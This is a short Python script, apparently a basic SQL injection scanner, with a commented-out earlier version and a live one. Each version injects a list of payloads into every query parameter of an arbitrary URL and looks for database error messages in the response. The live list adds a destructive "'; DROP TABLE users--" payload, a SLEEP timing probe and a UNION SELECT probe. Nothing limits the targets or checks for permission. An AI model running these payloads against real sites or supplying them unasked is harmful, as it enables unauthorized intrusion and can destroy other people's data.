# \
# import requests, re
# from urllib.parse import urlparse, urlunparse, parse_qs, urlencode

# ERROR_PATTERNS = [
#     r"SQL syntax", r"mysql_", r"Warning: mysqli", r"ODBC SQL", r"PostgreSQL", r"UNION.*SELECT",
#     r"ORA-\d{4}", r"SQLite/JDBCDriver", r"sql error", r"DB2 SQL error"
# ]

# PAYLOADS = [
#     "'", "\"", "' OR '1'='1", "\" OR \"1\"=\"1", "';--", "\";--", "admin'--", "1' AND '1'='1"
# ]

# def inject_params(url: str, payload: str) -> str:
#     parsed = urlparse(url)
#     query = parse_qs(parsed.query)
#     if not query:
#         query = {"q": [payload]}
#     else:
#         for k in list(query.keys()):
#             query[k] = [payload]
#     new_query = urlencode(query, doseq=True)
#     return urlunparse((parsed.scheme, parsed.netloc, parsed.path or "/", parsed.params, new_query, parsed.fragment))

# def scan_sql_injection(url: str, timeout: int = 10) -> dict:
#     results = {"possible": False, "evidence": [], "tested_payloads": []}
#     session = requests.Session()
#     session.headers.update({"User-Agent": "EduScanner/1.0"})
#     for p in PAYLOADS:
#         test_url = inject_params(url, p)
#         try:
#             r = session.get(test_url, timeout=timeout, allow_redirects=True)
#             body = r.text[:40000]  # limit
#             for pattern in ERROR_PATTERNS:
#                 if re.search(pattern, body, re.I):
#                     results["possible"] = True
#                     results["evidence"].append(f"Pattern '{pattern}' seen with payload {p!r}")
#                     break
#         except Exception as e:
#             # Network-level errors are not proof, just skip
#             pass
#         results["tested_payloads"].append(p)
#     return results



import requests, re
from urllib.parse import urlparse, urlunparse, parse_qs, urlencode

ERROR_PATTERNS = [
    r"SQL syntax", r"mysql_", r"Warning: mysqli", r"ODBC SQL", r"PostgreSQL", r"UNION.*SELECT",
    r"ORA-\d{4}", r"SQLite/JDBCDriver", r"sql error", r"DB2 SQL error", r"error in your SQL syntax"
]

ADVANCED_PAYLOADS = [
    "' OR 1=1--", "'; DROP TABLE users--", "' OR 'a'='a", "' AND SLEEP(5)--", 
    "\" OR \"1\"=\"1", "' UNION SELECT null, null, null--", "admin'--", "1' AND '1'='1"
]

def inject_params(url: str, payload: str) -> str:
    parsed = urlparse(url)
    query = parse_qs(parsed.query)
    if not query:
        query = {"q": [payload]}
    else:
        for k in list(query.keys()):
            query[k] = [payload]
    new_query = urlencode(query, doseq=True)
    return urlunparse((parsed.scheme, parsed.netloc, parsed.path or "/", parsed.params, new_query, parsed.fragment))

def scan_sql_injection(url: str, timeout: int = 10) -> dict:
    results = {"possible": False, "evidence": [], "tested_payloads": []}
    session = requests.Session()
    session.headers.update({"User-Agent": "AdvancedScanner/1.0"})
    
    for p in ADVANCED_PAYLOADS:
        test_url = inject_params(url, p)
        try:
            r = session.get(test_url, timeout=timeout, allow_redirects=True)
            body = r.text[:40000]
            for pattern in ERROR_PATTERNS:
                if re.search(pattern, body, re.I):
                    results["possible"] = True
                    results["evidence"].append(f"Pattern '{pattern}' seen with payload {p!r}")
                    break
        except Exception:
            pass
        results["tested_payloads"].append(p)
    
    return results
